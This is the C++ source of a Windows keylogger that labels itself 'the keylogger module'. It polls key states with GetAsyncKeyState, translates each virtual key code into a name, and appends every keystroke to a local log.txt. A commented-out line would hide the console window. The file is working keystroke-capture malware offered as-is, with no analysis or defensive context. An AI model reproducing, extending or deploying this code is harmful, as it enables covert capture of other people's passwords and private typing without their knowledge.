#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include<fstream>
#include <bits/stdc++.h>
using namespace std;
void logger(string str)
{	
	fstream file;
	file.open("log.txt",ios::app);
	str=" "+str+"\n"; 
	file<<str;
	file.close();
}

	string pressed(int KEY)
	{
		string response = "";
		switch (KEY)
		{
			case 1:
				response = "Left mouse button";
				break;
			case 2:
				response = "Right mouse button";
				break;
			case 3:
				response = "Control-break processing";
				break;
			case 4:
				response = "Middle mouse button (three-button mouse)";
				break;
			case 5:
				response = "X1 mouse button";
				break;
			case 6:
				response = "X2 mouse button";
				break;
			case 8:
				response = "BACKSPACE key";
				break;
			case 9:
				response = "TAB key";
				break;
			case 12:
				response = "CLEAR key";
				break;
			case 13:
				response = "ENTER key";
				break;
			case 16:
			case 160:
			case 161:
				response = "SHIFT key";
				break;
			case 17:
			case 162:
			case 163:	
				response = "CTRL key";
				break;
			case 18:
			case 164:
			case 165:
				response = "ALT key";
				break;
			case 20:
				response = "CAPS LOCK key";
				break;
			case 27:
				response = "ESC key";
				break;
			case 32:
				response = "SPACEBAR";
				break;
			case 33:
				response = "PAGE UP key";
				break;
			case 34:
				response = "PAGE DOWN key";
				break;
			case 35:
				response = "END key";
				break;
			case 36:
				response = "HOME key";
				break;
			case 37:
				response = "LEFT ARROW key";
				break;
			case 38:
				response = "UP ARROW key";
				break;
			case 39:
				response = "RIGHT ARROW key";
				break;
			case 40:
				response = "DOWN ARROW key";
				break;
			case 48:
				response = "0 key";
				break;
			case 49:
				response = "1 key";
				break;
			case 50:
				response = "2 key";
				break;
			case 51:
				response = "3 key";
				break;
			case 52:
				response = "4 key";
				break;
			case 53:
				response = "5 key";
				break;
			case 54:
				response = "6 key";
				break;
			case 55:
				response = "7 key";
				break;
			case 56:
				response = "8 key";
				break;
			case 57:
				response = "9 key";
				break;
			case 65:
				response = "A key";
				break;
			case 66:
				response = "B key";
				break;
			case 67:
				response = "C key";
				break;
			case 68:
				response = "D key";
				break;
			case 69:
				response = "E key";
				break;
			case 70:
				response = "F key";
				break;
			case 71:
				response = "G key";
				break;
			case 72:
				response = "H key";
				break;
			case 73:
				response = "I key";
				break;
			case 74:
				response = "J key";
				break;
			case 75:
				response = "K key";
				break;
			case 76:
				response = "L key";
				break;
			case 77:
				response = "M key";
				break;
			case 78:
				response = "N key";
				break;
			case 79:
				response = "O key";
				break;
			case 80:
				response = "P key";
				break;
			case 81:
				response = "Q key";
				break;
			case 82:
				response = "R key";
				break;
			case 83:
				response = "S key";
				break;
			case 84:
				response = "T key";
				break;
			case 85:
				response = "U key";
				break;
			case 86:
				response = "V key";
				break;
			case 87:
				response = "W key";
				break;
			case 88:
				response = "X key";
				break;
			case 89:
				response = "Y key";
				break;
			case 90:
				response = "Z key";
				break;
			case 91:
				response = "Windows key!";
				break;
			case 96:
				response = "Numeric keypad 0 key";
				break;
			case 97:
				response = "Numeric keypad 1 key";
				break;
			case 98:
				response = "Numeric keypad 2 key";
				break;
			case 99:
				response = "Numeric keypad 3 key";
				break;
			case 100:
				response = "Numeric keypad 4 key";
				break;
			case 101:
				response = "Numeric keypad 5 key";
				break;
			case 102:
				response = "Numeric keypad 6 key";
				break;
			case 103:
				response = "Numeric keypad 7 key";
				break;
			case 104:
				response = "Numeric keypad 8 key";
				break;
			case 105:
				response = "Numeric keypad 9 key";
				break;
			case 106:
				response = "Multiply key";
				break;
			case 107:
				response = "Add key";
				break;
			case 108:
				response = "Separator key";
				break;
			case 109:
				response = "Subtract key";
				break;
			case 110:
				response = "Decimal key";
				break;
			case 111:
				response = "Divide key";
				break;
			case 112:
				response = "F1 key";
				break;
			case 113:
				response = "F2 key";
				break;
			case 114:
				response = "F3 key";
				break;
			case 115:
				response = "F4 key";
				break;
			case 116:
				response = "F5 key";
				break;
			case 117:
				response = "F6 key";
				break;
			case 118:
				response = "F7 key";
				break;
			case 119:
				response = "F8 key";
				break;
			case 120:
				response = "F9 key";
				break;
			case 121:
				response = "F10 key";
				break;
			case 122:
				response = "F11 key";
				break;
			case 123:
				response = "F12 key";
				break;
			case 124:
				response = "F13 key";
				break;
			case 125:
				response = "F14 key";
				break;
			case 126:
				response = "F15 key";
				break;
			case 127:
				response = "F16 key";
				break;
			case 128:
				response = "F17 key";
				break;
			case 129:
				response = "F18 key";
				break;
			case 130:
				response = "F19 key";
				break;
			case 131:
				response = "F20 key";
				break;
			case 132:
				response = "F21 key";
				break;
			case 133:
				response = "F22 key";
				break;
			case 134:
				response = "F23 key";
				break;
			case 135:
				response = "F24 key";
				break;
			case 144:
				response = "NUM LOCK key";
				break;
			case 145:
				response = "SCROLL LOCK key";
				break;
			case 173:
				response = "Volume Mute key";
				break;
			case 174:
				response = "Volume Down key";
				break;
			case 175:
				response = "Volume Up key";
				break;
			case 176:
				response = "Next Track key";
				break;
			case 177:
				response = "Previous Track key";
				break;
			case 178:
				response = "Stop Media key";
				break;
			case 179:
				response = "Play/Pause Media key";
				break;
			case 186:
				response = "the ';:' key";
				break;
			case 187:
				response = " the '+' key";
				break;
			case 188:
				response = " the ',' key";
				break;
			case 189:
				response = " the '-' key";
				break;
			case 190:
				response = "the '.' key";
				break;
			default:
			cout<<"Not registered"<<KEY;
			response="-1";
		}
		return response;

	}

int main()
{
	cout << "Hey!! This is the keylogger module";
	cout << "\n Developed by Ar.T\n\n";
	// ShowWindow(GetConsoleWindow(), SW_HIDE);


	char KEY = 'x';
	int flag=1;
	
	while (true)
	{

		for (int KEY = 0; KEY <= 190; KEY++)

		{

			if (GetAsyncKeyState(KEY) == -32767)
			{
				//cout << "key pressed:" << KEY << endl;
				string str=pressed(KEY);
				if(str=="-1")
				continue;
				logger(str);
			}
		}
	}

	return 0;
}
